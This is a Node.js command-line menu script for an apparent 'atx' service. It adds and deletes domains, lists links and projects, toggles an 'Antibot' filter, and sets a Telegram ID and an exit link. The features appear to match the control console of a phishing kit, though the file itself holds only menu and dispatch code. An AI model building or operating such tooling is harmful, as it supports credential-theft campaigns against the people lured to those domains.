const fs = require('fs')
const path = require('path')
const inquirer = require('inquirer')
const dotenv = require('dotenv')

dotenv.config({path: path.join(__dirname, '../.env')});


const atxAgent = require('./lib/atx-agent')


const questionList = [
   
    {
        type: 'list',
        message: 'Select an ACTION To Perform',
        name: 'action',
        choices: [
        // new inquirer.Separator('-------Domain-------'),
        "Get Information",
        "Get Traffic",
                // new inquirer.Separator('-------Domain-------'),

        "Add Domain",
        "Delete Domain",
        "Get All Domains",
        "Get All Links",
        // new inquirer.Separator('-------Projects-------'),
        "Get All Projects",
        "Change Project",
        // new inquirer.Separator('-------Antibot-------'),
        "On Antibot",
        "Off Antibot",
        // new inquirer.Separator('-------Process-------'),
        "Set Exit Link",
        "Set Telegram ID",
        // "Off Proxy",
        // "On Proxy",
        "Start atx",
        "Stop atx",
        
        ]

    },
    {
        type: 'input',
        message: 'Enter Domain Name:',
        name: 'domainAction',
        when(answerList) {
            return ["Add Domain", "Delete Domain"].includes(answerList.action)
        }
    },

    {
        type: 'input',
        message: 'Enter Project Name:',
        name: 'projectAction',
        when(answerList) {
            return answerList.action === 'Change Project'
        }
    },

    {
        type: 'input',
        message: 'Enter Antibot URL;Key:',
        name: 'antibotInfo',
        when(answerList) {
            return answerList.action  === "On Antibot"
        }
    },
    {
        type: 'input',
        message: 'Enter Telegram ID:',
        name: 'telegramInfo',
        when(answerList) {
            return answerList.action  === "Set Telegram ID"
        }
    },
    {
        type: 'input',
        message: 'Enter Exit Link:',
        name: 'exitLink',
        when(answerList) {
            return answerList.action  === "Set Exit Link"
        }
    },
]




inquirer
  .prompt(questionList)
  .then((answerList => {

    console.log('\n')
      switch(answerList.action) {
            case "Get Information":
                return atxAgent.getInformation((success, appInfo) => {
                    if (success) {
                        console.log(`SERVER INFO:\n\n ${appInfo}`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case "Get Traffic":
                return atxAgent.getTraffic((success, appInfo) => {
                    if (success) {
                        console.log(`TRAFFIC INFO:\n\n ${appInfo}`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case 'Add Domain':

                return atxAgent.addDomain(answerList.domainAction.trim(), (success, appInfo) => {
                    if (success) {
                        console.log(`Added Domain: ${appInfo} to the server, you can use now..`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case 'Delete Domain':
                return atxAgent.deleteDomain(answerList.domainAction.trim(), (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Deleted domain: ${appInfo}`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })

            case "Get All Domains":
                return atxAgent.getDomains((success, appInfo) => {
                    if (success) {
                        console.log(appInfo)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
                    }
                })
            case "Get All Links":
                return atxAgent.getLinks((success, appInfo) => {
                    if (success) {
                        console.log(appInfo)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })

            case "Get All Projects":
                return atxAgent.getProjects((success, appInfo) => {
                    if (success) {
                        console.log(appInfo)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case "Change Project":
                const projectName = answerList.projectAction
                return atxAgent.changeProject(projectName, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Changed Project to: ${projectName}, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            
            case "On Antibot":
            case "Off Antibot":
                let antibotInfo = 'null;null'
                const antibotSwitch = answerList.action === 'On Antibot'? true : false
                if (antibotSwitch) {
                    antibotInfo = answerList.antibotInfo
                }
                return atxAgent.switchAntibot(antibotSwitch, antibotInfo, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Changed Anitbot TO ${antibotSwitch}, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })

            case "Set Telegram ID":
                const telegramID = answerList.telegramInfo
                return atxAgent.setTelegramID(telegramID, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Changed TelegramID to: ${telegramID}, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case "Set Exit Link":
                const exitLink = answerList.exitLink
                return atxAgent.setExitLink(exitLink, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Changed Exit Link to: ${exitLink}, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case "Start atx":
            case "Stop atx":
                const action = answerList.action === 'Start atx'? 'START' : 'STOP'

                return atxAgent.changeState(action, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully ${action}ED atx, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
                    }
                })
            default:
                console.error('Could not understand command')

      }

  }))